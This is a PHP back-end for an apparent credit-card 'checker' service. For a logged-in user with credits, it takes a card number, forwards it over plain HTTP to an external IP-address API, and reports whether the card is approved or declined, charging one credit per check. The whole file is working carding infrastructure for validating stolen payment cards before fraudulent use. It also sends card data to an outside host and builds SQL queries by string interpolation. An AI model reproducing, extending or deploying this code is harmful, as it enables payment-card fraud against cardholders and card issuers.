<?php
include('../config.php');
session_start();
header('Content-Type: application/json');

if (!isset($_SESSION['user_id'])) {
    echo json_encode(['status' => 'error', 'message' => 'Not logged in']);
    exit();
}

$user_id = $_SESSION['user_id'];

// Fetch current credits
$sql = "SELECT username, credit, total_cc, usertype FROM users WHERE id = '$user_id' LIMIT 1";
$result = mysqli_query($conn, $sql);
$user = mysqli_fetch_assoc($result);

if (!$user || $user['credit'] <= 0) {
    echo json_encode(['status' => 'error', 'message' => 'No credits left']);
    exit();
}

if (isset($_POST['cc'])) {
    $cc = trim($_POST['cc']);
    $api_url = "http://137.184.155.22:8080/check?cc=" . urlencode($cc);

    // Optional delay before sending request
    sleep(10);

    $start = microtime(true);
    $response = @file_get_contents($api_url);
    $end = microtime(true);
    $time_taken = round($end - $start, 2);

    $decoded = json_decode($response, true);

    // Fallbacks
    $reason = $decoded['reason'] ?? 'No reason';
    $status_raw = strtolower($decoded['status'] ?? '');
    $gateway = $decoded['gateway'] ?? 'N/A';

    // Determine status display
    if ($status_raw === 'declined') {
        $status_display = '𝗗𝗘𝗖𝗟𝗜𝗡𝗘 ❌';
    } else {
        $status_display = '𝗔𝗣𝗣𝗥𝗢𝗩𝗘 ✅';
    }

    // Deduct 1 credit only if valid API response
    if ($status_raw !== '') {
        $update = "UPDATE users SET credit = credit - 1 WHERE id = '$user_id'";
        mysqli_query($conn, $update);
    }

    // Final response for JS output formatting
    echo json_encode([
        'status' => $status_display,
        'card' => $cc,
        'message' => $reason,
        'gateway' => $gateway,
        'time' => $time_taken . 's'
    ]);

} else {
    echo json_encode([
        'status' => 'error',
        'message' => 'No card provided.'
    ]);
}
?>
